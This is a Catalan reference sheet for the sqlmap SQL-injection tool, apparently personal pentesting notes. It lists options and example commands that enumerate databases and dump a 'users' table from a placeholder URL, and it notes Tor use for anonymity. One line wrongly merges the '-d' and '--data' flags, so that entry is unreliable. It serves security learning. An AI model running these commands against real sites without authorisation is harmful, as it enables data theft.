# SQLMap

![](./img/sqlmapLogo.png)

[Home](../../../README.md)

[KaliTools](https://www.kali.org/tools/sqlmap/)

## Utilització

sqlmap [opcions] [objectiu]

### Paràmetres Comúns

Opcions per llançar atacs d'injecció SQL:

- `-u <URL>`, `--url <URL>` : Especifica la URL objectiu.
- `-d <connexió>`, `--data <connexió>` : Proporciona la cadena de connexió directa a la base de dades.
- `-r <arxiu>`, `--request-file <arxiu>` : Utilitza un fitxer amb les dades de la petició HTTP.
- `-p <paràmetre>`, `--parameter <paràmetre>` : Indica el paràmetre específic per provar.
- `--batch` : Mode automàtic, respon les preguntes per defecte.

Opcions de detecció i enumeració:

- `--level <número>` : Defineix el nivell d'agressivitat (per defecte, 1).
- `--risk <número>` : Estableix el risc dels tests (per defecte, 1).
- `--dbs` : Llista les bases de dades disponibles.
- `--tables` : Llista les taules d'una base de dades.
- `--columns` : Mostra les columnes d'una taula.
- `--dump` : Recupera les dades de la base de dades.

Altres opcions:

- `--tor` : Utilitza la xarxa Tor per anonimitzar l'atac.
- `--user-agent <string>` : Defineix un user-agent personalitzat.
- `--proxy <URL>` : Utilitza un servidor intermediari per a les peticions.
- `-o`, `--output-dir <dir>` : Especifica un directori per desar els resultats.

### Exemples d'ús

* Realitzar una anàlisi automàtica en una URL per trobar vulnerabilitats d'injecció:

    ```
    sqlmap -u "http://example.com/vulnerable?id=1"
    ```

<br>

* Llistar totes les bases de dades d'un servidor:

    ```
    sqlmap -u "http://example.com/vulnerable?id=1" --dbs
    ```

<br>

* Enumerar les taules de la base de dades `mydb`:

    ```
    sqlmap -u "http://example.com/vulnerable?id=1" -D mydb --tables
    ```

<br>

* Extraure el contingut de la taula `users` de `mydb`:

    ```
    sqlmap -u "http://example.com/vulnerable?id=1" -D mydb -T users --dump
    ```

<br>

* Executar l'atac amb un fitxer de petició HTTP:

    ```
    sqlmap -r request.txt --dbs
    ```

## Notes Addicionals
- Assegureu-vos de tenir permís legal abans de realitzar qualsevol prova de seguretat.
- Utilitzeu sqlmap amb responsabilitat i ética en entorns autoritzats.

